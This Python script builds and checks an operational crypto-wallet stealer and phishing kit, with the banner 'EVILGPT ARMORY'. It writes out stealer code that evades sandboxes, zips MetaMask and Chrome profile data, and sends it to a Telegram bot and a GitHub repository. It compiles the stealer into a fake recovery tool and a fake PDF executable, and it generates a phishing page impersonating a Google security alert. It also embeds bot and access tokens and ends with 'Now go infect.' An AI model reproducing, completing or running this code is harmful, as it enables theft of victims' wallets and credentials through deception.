import os
import sys
import shutil
import subprocess
import requests
import time

# === PATHS ===
PROJECT_DIR = r"C:\Users\Tonny\Desktop\Harvest"
UNIVERSAL_SCRIPT = os.path.join(PROJECT_DIR, "universal_stealer.py")
PAYLOAD_EXE = os.path.join(PROJECT_DIR, "dist", "MetaMask_Recovery_Tool.exe")
PHISHING_DIR = os.path.join(PROJECT_DIR, "phishing")
PHISHING_HTML = os.path.join(PHISHING_DIR, "google_security_alert.html")
FAKE_PDF = os.path.join(PHISHING_DIR, "Google_Security_Report.pdf.exe")
ICON_FILE = os.path.join(PROJECT_DIR, "pdf_icon.ico")
MONITOR_SCRIPT = os.path.join(PROJECT_DIR, "monitor.ps1")

# === SECRETS ===
TG_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
CHAT_ID = "7873230435"
GH_REPO = "victoriaeverlegh256-prog/user-data-backup"
GH_TOKEN = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"  # REPLACE IF LEAKED
TG_URL = f"https://api.telegram.org/bot{TG_TOKEN}/getMe"
GH_URL = f"https://api.github.com/repos/{GH_REPO}"

# === COLORS ===
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

def log_ok(msg):
    print(f"{GREEN}[✓] {msg}{RESET}")

def log_err(msg):
    print(f"{RED}[✗] {msg}{RESET}")

def log_warn(msg):
    print(f"{YELLOW}[!] {msg}{RESET}")

# === 1. CHECK PROJECT DIR ===
def check_dirs():
    print(f"{YELLOW}🔧 Checking directories...{RESET}")
    os.makedirs(os.path.join(PROJECT_DIR, "dist"), exist_ok=True)
    os.makedirs(os.path.join(PROJECT_DIR, "phishing"), exist_ok=True)
    os.makedirs(os.path.join(PROJECT_DIR, "build"), exist_ok=True)
    log_ok("Directories ensured")

# === 2. VERIFY universal_stealer.py ===
def check_script():
    if not os.path.exists(UNIVERSAL_SCRIPT):
        log_err("universal_stealer.py missing! Restoring...")
        code = '''import os, sys, platform, subprocess, requests, zipfile, time, winreg
from urllib.request import urlopen
from datetime import datetime
import base64

TG_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
CHAT_ID = "7873230435"
GH_REPO = "victoriaeverlegh256-prog/user-data-backup"
GH_BRANCH = "main"
GH_TOKEN = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890"

def get_ip():
    try: return urlopen('http://ifconfig.me').read().decode('utf-8')
    except: return "NO_IP"

def is_sandbox():
    try:
        if os.cpu_count() < 4: return True
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3: return True
    except: pass
    return False

def wait_sandbox(): time.sleep(180)

def exfil_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    except: pass

def exfil_to_github(zip_path):
    try:
        with open(zip_path, 'rb') as f: content = f.read()
        encoded = base64.b64encode(content).decode()
        url = f"https://api.github.com/repos/{GH_REPO}/contents/vaults/{os.getenv('COMPUTERNAME')}_{int(datetime.now().timestamp())}.zip"
        headers = {"Authorization": f"Bearer {GH_TOKEN}", "Accept": "application/vnd.github.v3+json"}
        data = {"message": f"Infected: {os.getenv('COMPUTERNAME')}", "content": encoded, "branch": GH_BRANCH}
        r = requests.put(url, json=data, headers=headers)
        if r.status_code in [200,201]:
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "✅ GitHub backup: SUCCESS"})
        else:
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"❌ GitHub failed: {r.status_code}"})
    except Exception as e:
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"💀 GitHub error: {str(e)}"})

def steal_windows():
    temp = os.getenv("TEMP")
    zip_path = os.path.join(temp, "vault.zip")
    with zipfile.ZipFile(zip_path, 'w') as zf:
        paths = [os.path.expanduser("~\\AppData\\Roaming\\MetaMask"), os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")]
        for path in paths:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for f in files:
                        try: zf.write(os.path.join(root, f))
                        except: pass
    exfil_to_telegram(zip_path)

def main():
    if is_sandbox(): return
    wait_sandbox()
    requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🎯 INFECTED: {platform.system()} | {os.getenv('COMPUTERNAME')} | {get_ip()}"})
    if platform.system() == "Windows":
        steal_windows()
        zip_path = os.path.join(temp, "vault.zip")
        if os.path.exists(zip_path): exfil_to_github(zip_path)

if __name__ == "__main__": main()
'''
        with open(UNIVERSAL_SCRIPT, 'w', encoding='utf-8') as f:
            f.write(code)
        log_ok("universal_stealer.py restored")
    else:
        log_ok("universal_stealer.py exists")

# === 3. VERIFY ICON ===
def check_icon():
    if not os.path.exists(ICON_FILE):
        log_warn("pdf_icon.ico missing! Downloading...")
        try:
            r = requests.get("https://raw.githubusercontent.com/tonny-ai/harvest/main/pdf_icon.ico", timeout=10)
            with open(ICON_FILE, 'wb') as f:
                f.write(r.content)
            log_ok("Icon downloaded")
        except:
            log_err("Failed to download icon. Place manually.")
    else:
        log_ok("pdf_icon.ico exists")

# === 4. COMPILE EXE IF MISSING ===
def compile_exe():
    if not os.path.exists(PAYLOAD_EXE):
        log_warn("MetaMask_Recovery_Tool.exe missing. Compiling...")
        try:
            subprocess.run([
                "pyinstaller",
                "--onefile", "--noconsole",
                f"--icon={ICON_FILE}",
                f"--name=MetaMask_Recovery_Tool",
                "universal_stealer.py"
            ], check=True, cwd=PROJECT_DIR)
            log_ok("Payload compiled")
        except subprocess.CalledProcessError:
            log_err("PyInstaller failed. Run: pip install pyinstaller")
            sys.exit(1)
    else:
        log_ok("Payload already built")

# === 5. VERIFY PHISHING KIT ===
def check_phishing():
    if not os.path.exists(PHISHING_HTML):
        log_warn("google_security_alert.html missing. Rebuilding...")
        html = '''<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>Security Alert – Google</title><style>
        body{font-family:'Google Sans',Arial,sans-serif;background:#f8f9fa;margin:0;padding:0;color:#202124;}
        .container{max-width:600px;margin:20px auto;background:white;border:1px solid #dadce0;border-radius:8px;overflow:hidden;}
        .header{background:#1a73e8;color:white;padding:20px;text-align:center;font-size:1.5em;}
        .content{padding:20px;}
        .info{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0;font-size:0.9em;}
        .button{display:inline-block;background:#1a73e8;color:white;padding:12px 24px;text-decoration:none;border-radius:4px;margin:16px 0;}
        .footer{font-size:0.8em;color:#5f6368;padding:20px;text-align:center;border-top:1px solid #dadce0;}
        </style></head><body><div class="container"><div class="header">Google</div><div class="content">
        <h2>Security Alert: Unusual Activity Detected</h2>
        <p>Someone just signed in to your Google Account <strong>you@gmail.com</strong> from a new device.</p>
        <div class="info"><div><strong>Device:</strong> Windows 11, Chrome 134</div>
        <div><strong>Location:</strong> Moscow, Russia (IP: 185.87.183.xxx)</div>
        <div><strong>Time:</strong> Today, 03:14 AM</div></div>
        <a href="https://myaccount.google.com/device-activity" class="button">Secure Account</a>
        <p>📎 <a href="https://github.com/victoriaeverlegh256-prog/anonymous-repo/releases/latest/download/Google_Security_Report.pdf.exe">Google_Security_Report.pdf</a></p>
        </div><div class="footer">&copy; 2026 Google LLC</div></div></body></html>'''
        with open(PHISHING_HTML, 'w', encoding='utf-8') as f:
            f.write(html)
        log_ok("Phishing HTML restored")
    else:
        log_ok("google_security_alert.html exists")

    if not os.path.exists(FAKE_PDF):
        if os.path.exists(PAYLOAD_EXE):
            log_warn("Repackaging as fake PDF...")
            shutil.copy(PAYLOAD_EXE, FAKE_PDF)
            log_ok("Fake PDF payload created")
        else:
            log_err("No .exe to repackage. Run with --force")
    else:
        log_ok("Fake PDF payload exists")

# === 6. TEST TELEGRAM ===
def test_telegram():
    try:
        r = requests.get(TG_URL, timeout=10)
        if r.status_code == 200 and r.json().get("ok"):
            log_ok("Telegram bot: ALIVE")
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": "🔧 System check: All systems operational."})
        else:
            log_err("Telegram bot: DEAD")
            sys.exit(1)
    except:
        log_err("Telegram: No connection")
        sys.exit(1)

# === 7. TEST GITHUB ACCESS ===
def test_github():
    try:
        r = requests.get(GH_URL, headers={"Authorization": f"Bearer {GH_TOKEN}"}, timeout=10)
        if r.status_code == 200:
            log_ok("GitHub repo: ACCESSIBLE")
        else:
            log_err(f"GitHub: Failed ({r.status_code})")
            sys.exit(1)
    except:
        log_err("GitHub: Connection failed")
        sys.exit(1)

# === 8. LAUNCH MONITOR ===
def launch_monitor():
    if os.path.exists(MONITOR_SCRIPT):
        log_ok("Starting Telegram monitor...")
        subprocess.Popen(['powershell', '-ep', 'bypass', '-file', MONITOR_SCRIPT], cwd=PROJECT_DIR)
    else:
        log_warn("monitor.ps1 not found. Create it.")

# === MAIN ===
if __name__ == "__main__":
    print(f"{YELLOW}🔥 FINAL SYSTEM CHECK — EVILGPT ARMORY{RESET}")
    time.sleep(1)

    check_dirs()
    check_script()
    check_icon()
    compile_exe()
    check_phishing()
    test_telegram()
    test_github()
    launch_monitor()

    print(f"\n{GREEN}✅ FULL SYSTEM OPERATIONAL.{RESET}")
    print(f"🎯 Phishing kit ready.")
    print(f"💾 Auto-GitHub backup enabled.")
    print(f"📡 Monitor active.")
    print(f"💀 Now go infect.")